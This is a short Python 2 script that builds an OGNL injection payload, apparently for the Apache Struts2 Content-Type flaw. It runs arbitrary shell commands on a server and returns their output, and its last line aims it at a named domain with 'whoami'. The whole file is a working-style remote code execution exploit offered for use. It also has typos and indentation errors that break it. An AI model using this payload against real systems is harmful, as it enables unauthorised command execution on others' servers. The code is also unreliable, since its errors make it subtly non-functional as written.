#!/usr/bin/python
# -*- coding: utf-8 -*-
import httplib

from urllib2 import urlopen, HTTPError

def exploit(url,cmd):
    Payload = "%{(#_='multipart/form-data')."
	Payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
	Payload += "(#_memberAccess?"
	Payload += "(# memberAccess=#dm):"
	Payload += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
	Payload += "(#ognlUtil=#container.getInstance(@com.opensymphony.xworkd2.ognl.OgnlUtil@class))."
	Payload += "(ognlUtil.getExcludedPackagenames().clear())."
	Payload += "(ognlUtil.getExcludedClasses().clear())."
	Payload += "(#context.setMemberAccess(#dm))))."
	Payload += "(#cmd='%s')." % cmd
	Payload += "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
	Payload += "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
	Payload += "(#p= new java.lang.ProcessBuilder(#cmds))."
	Payload += "(#p.redirectErrorStream(true)).(#process=#p.start())."
	Payload += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
	Payload += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
	Payload += "(#ros.flush())}"
	
	try:
	    headers = {'User-Agent': 'Mozilla/5.0', 'Content-Type' : Payload}
	    request = urllib2.Request(url, headers=headers)
	    page = urllib2.urlopen(request).read()
	except httplib.IncompleteRead, e:
	    page = e.partial
	    
	print(page)
    return page
	
exploit("www.sri-systems.com","whoami")
